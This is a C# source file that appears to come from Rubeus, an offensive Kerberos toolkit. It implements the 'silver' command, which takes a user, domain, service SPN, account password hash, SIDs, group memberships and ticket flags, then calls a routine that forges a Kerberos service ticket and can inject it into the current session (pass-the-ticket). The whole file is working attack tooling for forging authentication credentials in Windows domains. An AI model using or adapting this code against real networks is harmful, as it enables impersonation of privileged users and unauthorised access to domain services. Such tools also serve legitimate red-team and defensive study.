using System;
using System.Collections.Generic;
using System.Globalization;
using System.Text.RegularExpressions;

namespace Rubeus.Commands
{
    public class Silver : ICommand
    {
        public static string CommandName => "silver";

        public void Execute(Dictionary<string, string> arguments)
        {
            Console.WriteLine("[*] Action: Build TGS\r\n");

            string user = "";
            string domain = "";
            string hash = "";
            Interop.KERB_ETYPE encType = Interop.KERB_ETYPE.subkey_keymaterial;
            string outfile = "";
            bool ptt = false;
            string service = "";
            string sid = "";
            int uid = 500;
            bool ldap = false;
            System.Net.NetworkCredential cred = null;
            string dc = "";
            string netbios = "";
            string sids = "";
            string groups = "";
            string krbKey = "";
            Interop.KERB_CHECKSUM_ALGORITHM krbEncType = Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES256;
            Interop.TicketFlags flags = Interop.TicketFlags.forwardable | Interop.TicketFlags.renewable | Interop.TicketFlags.pre_authent;
            DateTime startTime = DateTime.UtcNow;
            DateTime authTime = startTime;
            DateTime? rangeEnd = null;
            string rangeInterval = "1d";
            string endTime = "";
            string renewTill = "";

            if (arguments.ContainsKey("/user"))
            {
                string[] parts = arguments["/user"].Split('\\');
                if (parts.Length == 2)
                {
                    domain = parts[0];
                    user = parts[1];
                }
                else
                {
                    user = arguments["/user"];
                }
            }
            if (arguments.ContainsKey("/domain"))
            {
                domain = arguments["/domain"];
            }
            if (arguments.ContainsKey("/netbios"))
            {
                netbios = arguments["/netbios"];
            }
            if (arguments.ContainsKey("/outfile"))
            {
                outfile = arguments["/outfile"];
            }
            if (arguments.ContainsKey("/service"))
            {
                service = arguments["/service"];
            }
            else
            {
                Console.WriteLine("[X] SPN '/service:sname/server.domain.com' is required");
                return;
            }
            if (arguments.ContainsKey("/sid"))
            {
                sid = arguments["/sid"];
            }
            if (arguments.ContainsKey("/sids"))
            {
                sids = arguments["/sids"];
            }
            if (arguments.ContainsKey("/groups"))
            {
                groups = arguments["/groups"];
            }
            if (arguments.ContainsKey("/ldap"))
            {
                ldap = true;
                if (arguments.ContainsKey("/creduser"))
                {
                    // provide an alternate user to use for connection creds
                    if (!Regex.IsMatch(arguments["/creduser"], ".+\\.+", RegexOptions.IgnoreCase))
                    {
                        Console.WriteLine("\r\n[X] /creduser specification must be in fqdn format (domain.com\\user)\r\n");
                        return;
                    }

                    try
                    {
                        string[] parts = arguments["/creduser"].Split('\\');
                        string domainName = parts[0];
                        string userName = parts[1];

                        // provide an alternate password to use for connection creds
                        if (!arguments.ContainsKey("/credpassword"))
                        {
                            Console.WriteLine("\r\n[X] /credpassword is required when specifying /creduser\r\n");
                            return;
                        }

                        string password = arguments["/credpassword"];

                        cred = new System.Net.NetworkCredential(userName, password, domainName);
                    }
                    catch
                    {
                        Console.WriteLine("\r\n[X] /creduser specification must be in fqdn format (domain.com\\user)\r\n");
                        return;
                    }
                }
            }
            if (arguments.ContainsKey("/uid"))
            {
                uid = Int32.Parse(arguments["/uid"]);
            }

            encType = Interop.KERB_ETYPE.rc4_hmac; //default is non /enctype is specified
            if (arguments.ContainsKey("/enctype"))
            {
                string encTypeString = arguments["/enctype"].ToUpper();

                if (encTypeString.Equals("RC4") || encTypeString.Equals("NTLM"))
                {
                    encType = Interop.KERB_ETYPE.rc4_hmac;
                }
                else if (encTypeString.Equals("AES128"))
                {
                    encType = Interop.KERB_ETYPE.aes128_cts_hmac_sha1;
                }
                else if (encTypeString.Equals("AES256") || encTypeString.Equals("AES"))
                {
                    encType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
                }
                else if (encTypeString.Equals("DES"))
                {
                    encType = Interop.KERB_ETYPE.des_cbc_md5;
                }
            }

            if (arguments.ContainsKey("/des"))
            {
                hash = arguments["/des"];
                encType = Interop.KERB_ETYPE.des_cbc_md5;
            }
            else if (arguments.ContainsKey("/rc4"))
            {
                hash = arguments["/rc4"];
                encType = Interop.KERB_ETYPE.rc4_hmac;
            }
            else if (arguments.ContainsKey("/ntlm"))
            {
                hash = arguments["/ntlm"];
                encType = Interop.KERB_ETYPE.rc4_hmac;
            }
            else if (arguments.ContainsKey("/aes128"))
            {
                hash = arguments["/aes128"];
                encType = Interop.KERB_ETYPE.aes128_cts_hmac_sha1;
            }
            else if (arguments.ContainsKey("/aes256"))
            {
                hash = arguments["/aes256"];
                encType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
            }

            if (arguments.ContainsKey("/ptt"))
            {
                ptt = true;
            }

            if (arguments.ContainsKey("/dc"))
            {
                dc = arguments["/dc"];
            }

            if (arguments.ContainsKey("/krbkey"))
            {
                krbKey = arguments["/krbkey"];
            }

            if (arguments.ContainsKey("/krbenctype"))
            {
                if (String.IsNullOrEmpty(krbKey))
                {
                    Console.WriteLine("[!] '/krbkey' not specified ignoring the '/krbenctype' argument");
                }
                else
                {
                    string krbEncTypeString = arguments["/krbenctype"].ToUpper();

                    if (krbEncTypeString.Equals("RC4") || krbEncTypeString.Equals("NTLM") || krbEncTypeString.Equals("DES"))
                    {
                        krbEncType = Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_MD5;
                    }
                    else if (krbEncTypeString.Equals("AES128"))
                    {
                        krbEncType = Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES128;
                    }
                    else if (krbEncTypeString.Equals("AES256") || krbEncTypeString.Equals("AES"))
                    {
                        krbEncType = Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES256;
                    }
                }
            }

            if (arguments.ContainsKey("/flags"))
            {
                Interop.TicketFlags tmp = Interop.TicketFlags.empty;

                foreach (string flag in arguments["/flags"].Split(','))
                {
                    Interop.TicketFlags result;
                    bool status = Interop.TicketFlags.TryParse(flag, out result);

                    if (status)
                    {
                        tmp |= result;
                    }
                    else
                    {
                        Console.WriteLine("[X] Error the following flag name passed is not valid: {0}", flag);
                    }
                }
                if (tmp != Interop.TicketFlags.empty)
                {
                    flags = tmp;
                }
            }

            if (arguments.ContainsKey("/starttime"))
            {
                try
                {
                    startTime = DateTime.Parse(arguments["/starttime"], CultureInfo.CurrentCulture, DateTimeStyles.AssumeLocal).ToUniversalTime();
                }
                catch (Exception e)
                {
                    Console.WriteLine("[X] Error unable to parse supplied /starttime {0}: {1}", arguments["/starttime"], e.Message);
                    return;
                }
            }
            if (arguments.ContainsKey("/authtime"))
            {
                try
                {
                    authTime = DateTime.Parse(arguments["/authtime"], CultureInfo.CurrentCulture, DateTimeStyles.AssumeLocal).ToUniversalTime();
                }
                catch (Exception e)
                {
                    Console.WriteLine("[!] Unable to parse supplied /authtime {0}: {1}", arguments["/authtime"], e.Message);
                    authTime = startTime;
                }
            }
            else if (arguments.ContainsKey("/starttime"))
            {
                authTime = startTime;
            }
            if (arguments.ContainsKey("/rangeend"))
            {
                rangeEnd = Helpers.FurtureDate(startTime, arguments["/rangeend"]);
                if (rangeEnd == null)
                {
                    Console.WriteLine("[!] Ignoring invalid /rangeend argument: {0}", arguments["/rangeend"]);
                    rangeEnd = startTime;
                }
            }
            if (arguments.ContainsKey("/rangeinterval"))
            {
                rangeInterval = arguments["/rangeinterval"];
            }
            if (arguments.ContainsKey("/endtime"))
            {
                endTime = arguments["/endtime"];
            }
            if (arguments.ContainsKey("/renewtill"))
            {
                renewTill = arguments["/renewtill"];
            }

            if (String.IsNullOrEmpty(user))
            {
                Console.WriteLine("\r\n[X] You must supply a user name!\r\n");
                return;
            }
            if (String.IsNullOrEmpty(hash))
            {
                Console.WriteLine("\r\n[X] You must supply a [/des|/rc4|/aes128|/aes256] hash!\r\n");
                return;
            }

            if (!((encType == Interop.KERB_ETYPE.des_cbc_md5) || (encType == Interop.KERB_ETYPE.rc4_hmac) || (encType == Interop.KERB_ETYPE.aes128_cts_hmac_sha1) || (encType == Interop.KERB_ETYPE.aes256_cts_hmac_sha1)))
            {
                Console.WriteLine("\r\n[X] Only /des, /rc4, /aes128, and /aes256 are supported at this time.\r\n");
                return;
            }
            else
            {
                ForgeTickets.ForgeTicket(user, service, Helpers.StringToByteArray(hash), encType, Helpers.StringToByteArray(krbKey), krbEncType, ldap, cred, sid, domain, netbios, dc, uid, groups, sids, outfile, ptt, flags, startTime, rangeEnd, rangeInterval, authTime, endTime, renewTill);
                return;
            }
        }
    }
}
